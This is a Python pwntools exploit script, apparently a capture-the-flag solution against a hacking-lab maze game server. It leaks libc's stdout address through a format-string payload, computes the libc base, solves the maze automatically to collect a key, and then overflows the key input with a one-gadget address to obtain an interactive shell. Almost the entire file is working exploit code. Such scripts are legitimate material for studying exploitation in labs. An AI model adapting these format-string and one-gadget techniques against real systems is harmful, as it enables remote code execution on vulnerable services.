from pwn import *

# context(arch = 'i386', os='linux')

url = "whale.hacking-lab.com"
port = 7331

key = None
OFFSET_ONE_GADGET = 0xf1147

# for my server it is 0x4f322
# OFFSET_ONE_GADGET = 0x10a38c
# url = "localhost"
# port =  2323
r = remote(url, port)


def goToUserInput():
    r.sendline("exit")
    r.recvuntil(">")
    r.sendline("1")
    return r.recvuntil(">")


def leakaddr(fmtstr):
    r.sendline(fmtstr)
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(">")
    r.sendline("whoami")
    return r.recvuntil(">")


def checkDir(r, maze, posy, posx):
    if checked[posy][posx] == 1:
        return ""
    possible = {}
    # print("I am at ", posy, posx)
    for d in ['north', 'east', 'south', 'west']:
        #       print("trying ", d)
        r.sendline("go {0}".format(d))
        ans = r.recvuntil(">")
        possible[d] = not "wall" in ans
        # Undo move
        if not "wall" in ans:
            #               print("Stepped ok, undoing")
            if d == "north":
                r.sendline("go south")
            elif d == "east":
                r.sendline("go west")
            elif d == "south":
                r.sendline("go north")
            else:
                r.sendline("go east")
            ans = r.recvuntil(">")
    # print("Setting values, relative to ",posy,posx)
    if possible["north"]:
        #        print("Opened north")
        if maze[posy - 1][posx] != 3:
            maze[posy - 1][posx] = 0
    if possible["east"]:
        #        print("Opened east")
        if maze[posy][posx + 1] != 3:
            maze[posy][posx + 1] = 0
    if possible["south"]:
        #        print("Opened south")
        if maze[posy + 1][posx] != 3:
            maze[posy + 1][posx] = 0
    if possible["west"]:
        #        print("Opened west")
        if maze[posy][posx - 1] != 3:
            maze[posy][posx - 1] = 0
    #       print(possible)
    checked[posy][posx] = 1
    return ans


def printMaze(maze):
    # print("Current character pos: ", posy, posx)
    row = -1
    col = -1
    for y in maze:
        row += 1
        s = ""
        col = -1
        for x in y:
            col += 1
            if x == 1:
                xp = chr(219)
            elif x == 0:
                xp = " "
            else:
                xp = "."
            if col == posx and row == posy:
                xp = "@"
            s += str(xp)
        print(s)


def godirect(direct):
    global posx
    global posy
    global key
    if direct == "north":
        r.sendline("go north")
        posy -= 1
    elif direct == "south":
        r.sendline("go south")
        posy += 1
    elif direct == "east":
        r.sendline("go east")
        posx += 1
    else:
        r.sendline("go west")
        posx -= 1
    ans = r.recvuntil(">")
    print(ans)
    # Send search command
    r.sendline("search")
    ans = r.recvuntil(">")
    print(ans)
    if "You found a key!" in ans:
        # waitKey()
        if key == None:
            r.sendline("pick up")
            ans = r.recvuntil(">")
            if "You pick up the key" in ans:
                key = ans.split(":")[1]
                key = key.strip()
                key = key[:32]

                print("I FOUND THE KEY!!", key)
                # waitKey()
            else:
                print(ans)
                # waitKey()
    if "You found a locked chest!" in ans:
        print(ans)
        print("I FOUND THE CHEST!")
        #           waitKey()
        if key != None:
            r.sendline("open")
            ans = r.recvuntil(">")
            if "The chest is locked. Please enter the key:":
                print("I WILL NOW SEND THE PAYLOAD!")
                #                    waitKey()
                #               test send the real keyy immediately

                pay = key
                onegadget_addr = LIBC_BASE_ADDR + OFFSET_ONE_GADGET
                print("Patching 'error' to address {0}".format(hex(onegadget_addr)))
                pay += p64(onegadget_addr)
                r.sendline(pay)
                ans = r.recvuntil("Press enter to return to the menue")
                print(ans)
                r.interactive()
                # Go back to menu
        else:
            print("But I don't have a key yet...")
    #                waitKey()
    printMaze(maze)


def waitKey():
    print("Press a key to continue")
    sys.stdin.read(1)
    print("OK")


def search(r, maze, y, x, direct):
    global posy
    global posx
    # print("Trying ", y, x)
    #        sys.stdin.read(1)
    print(checkDir(r, maze, posy, posx))
    if maze[y][x] == 1:
        return False
    if maze[y][x] == 3:
        return False
    maze[y][x] = 3
    godirect(direct)
    oldposy = posy
    oldposx = posx
    posy = y
    posx = x
    #    printMaze(maze)
    if search(r, maze, y, x + 1, "east") or search(r, maze, y + 1, x, "south") or search(r, maze, y, x - 1,
                                                                                         "west") or search(r, maze,
                                                                                                           y - 1, x,
                                                                                                           "north"):
        print("Did one step")
        return True
    print("Did not find a step,need to backtrack")
    if direct == "north":
        godirect("south")
    elif direct == "south":
        godirect("north")
    elif direct == "east":
        godirect("west")
    elif direct == "west":
        godirect("east")

    return False


r.recvuntil(">")

# Send format string exploit in username

print("Determining addr of libc_2.23.so:_IO_2_1_stdout_")

# On my box its %7$lx

# ans10 = leakaddr("|%7$lx|\n") # addr of _IO_2_1_stdout_

ans10 = leakaddr("|%10$lx|\n")  # addr of _IO_2_1_stdout_
ans10 = ans10.split("|")[1]

STDOUT_ADDR = int(ans10, 16)
STDOUT_ADDR_STR = hex(STDOUT_ADDR)
STDOUT_OFFSET = 0x3C5620
# STDOUT_OFFSET = 0x3ec760

print("10th: {0} (libc_2.23.so:_IO_2_1_stdout_)".format(STDOUT_ADDR_STR))
print("Using libc_2.23:so:_IO_2_1_stdout_ to calculate base of libc")
print("_IO_2_1_stdout_ is 0x3C5620 bytes away from start of libc")

LIBC_BASE_ADDR = STDOUT_ADDR - STDOUT_OFFSET
LIBC_BASE_ADDR_STR = hex(LIBC_BASE_ADDR)
print("Base of libc: {0}".format(LIBC_BASE_ADDR_STR))

waitKey()
#
# libc6_2.23-0ubuntu10_amd64
# libc6_2.23-0ubuntu11_amd64
#

print("Starting game")

r.sendline("3")
ans = r.recvuntil(">")

dim = 50
maze = [[1] * dim for x in xrange(dim)]
checked = [[0] * dim for x in xrange(dim)]
posx = dim / 2
posy = dim / 2

maze[posy][posx] = 0
print(ans)
printMaze(maze)

while True:
    checkDir(r, maze, posy, posx)
    # printMaze(maze)
    # print(posy,posx)
    if maze[posy][posx + 1] == 0:
        search(r, maze, posy, posx + 1, "east")
    elif maze[posy - 1][posx] == 0:
        search(r, maze, posy - 1, posx, "north")
    elif maze[posy][posx - 1] == 0:
        search(r, maze, posy, posx - 1, "west")
    else:
        search(r, maze, posy + 1, posx, "south")

    # It can happen that the chest is discovered first in one branch
    # and the key is in another branch. In this constellation, we will never
    # visit again the branch with the chest and thus cannot solve
    # Therefore, if we return to the start, we run once again and forget about
    # already visited fields

    print("Restarting the recursive walk!")
    waitKey()
    maze = [[1] * dim for x in xrange(dim)]

while True:
    pass

